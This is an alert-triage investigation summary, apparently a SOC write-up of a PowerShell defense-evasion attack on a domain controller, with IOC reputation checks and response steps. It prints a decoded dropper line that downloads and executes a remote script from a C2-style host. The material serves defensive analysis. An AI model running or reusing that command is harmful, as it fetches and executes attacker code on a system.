@@ -1,0 +1,77 @@
+## Investigation Summary
+
+### Alert Classification and Severity Assessment
+- **Alert Type:** High severity PowerShell-based defense evasion attack
+- **Risk Score:** 87/100
+- **MITRE ATT&CK Techniques:** T1059.001 (PowerShell), T1027 (Obfuscated Files)
+- **Target:** Domain Controller (DC01.corp.widgets-inc.com)
+
+### Decoded PowerShell Command
+The base64 encoded command decodes to:
+```powershell
+IEX (New-Object Net.WebClient).DownloadString('https://c2-relay.darkops.net/stager.ps1')
+```
+This is a classic malware dropper pattern attempting to download and execute a remote PowerShell script.
+
+### Indicators of Compromise Analysis
+
+#### 1. IP Address: 198.51.100.99
+**Risk Assessment: LOW**
+- **VirusTotal:** 0/94 malicious detections, marked as "private" and "harmless"
+- **AbuseIPDB:** 0% abuse confidence score, marked as "Reserved" usage type
+- **Analysis:** This is a TEST-NET-1 reserved IP address (RFC 5737) used for documentation and testing. It should never appear in live network traffic, making its presence highly suspicious despite clean reputation scores.
+
+#### 2. Domain: c2-relay.darkops.net
+**Risk Assessment: HIGH**
+- **VirusTotal:** 0/94 malicious detections but tagged as "dga" (Domain Generation Algorithm)
+- **Registration:** Registered 2013-11-28, expires 2024-11-28
+- **Registrar:** EurotrashNames.com LLC with privacy masking
+- **Analysis:** The domain name "c2-relay.darkops.net" is highly suspicious - "c2-relay" suggests command and control infrastructure, and "darkops" implies malicious operations. The DGA tag indicates algorithmic domain generation commonly used by malware.
+
+#### 3. URL: https://c2-relay.darkops.net/stager.ps1
+**Risk Assessment: HIGH**
+- **VirusTotal:** URL not found in database (404 error)
+- **Analysis:** The URL path "/stager.ps1" is consistent with malware staging operations. The 404 error suggests the payload may have been removed or the infrastructure taken down.
+
+#### 4. File Hash: de96a6e69944335375dc1ac238336066889d9ffc7d73628ef4fe1b1b160ab32c
+**Risk Assessment: LOW (Legitimate Binary)**
+- **VirusTotal:** 0/71 malicious detections, identified as legitimate Microsoft PowerShell.exe
+- **Signature:** Validly signed by Microsoft Corporation
+- **Analysis:** This is the legitimate Windows PowerShell executable. The hash matches the official Microsoft PowerShell binary, indicating the attack used a legitimate system tool (Living off the Land technique).
+
+### Overall Verdict: **TRUE POSITIVE**
+
+This is a confirmed malicious attack with the following evidence:
+1. **Encoded PowerShell execution** with execution policy bypass and hidden window
+2. **Suspicious domain** with C2-related naming convention
+3. **Reserved IP address** that should never appear in production traffic
+4. **Living off the Land** technique using legitimate PowerShell binary
+5. **Execution on critical infrastructure** (Domain Controller)
+
+### Recommended Next Steps
+
+**IMMEDIATE ACTIONS:**
+1. **Isolate DC01** immediately to prevent lateral movement
+2. **Block c2-relay.darkops.net** at DNS and firewall level
+3. **Hunt for additional compromised systems** using the same IOCs
+4. **Check for persistence mechanisms** on DC01 (scheduled tasks, registry, services)
+
+**INVESTIGATION ACTIONS:**
+1. **Memory dump analysis** of DC01 for additional artifacts
+2. **Network traffic analysis** for communications to 198.51.100.99 and c2-relay.darkops.net
+3. **Timeline analysis** to determine initial compromise vector
+4. **Privilege escalation assessment** - how did the attack reach SYSTEM level on DC?
+
+**CONTAINMENT ACTIONS:**
+1. **Reset all domain admin credentials**
+2. **Audit all domain controller logs** for unauthorized changes
+3. **Implement enhanced monitoring** for PowerShell execution with encoded commands
+4. **Deploy additional EDR coverage** if not already present
+
+**RECOVERY ACTIONS:**
+1. **Full forensic imaging** of DC01 before remediation
+2. **Malware removal** and system hardening
+3. **Restore from known-good backups** if compromise is extensive
+4. **Implement PowerShell logging and execution policies**
+
+This attack represents a significant security incident given the compromise of a domain controller using sophisticated evasion techniques.
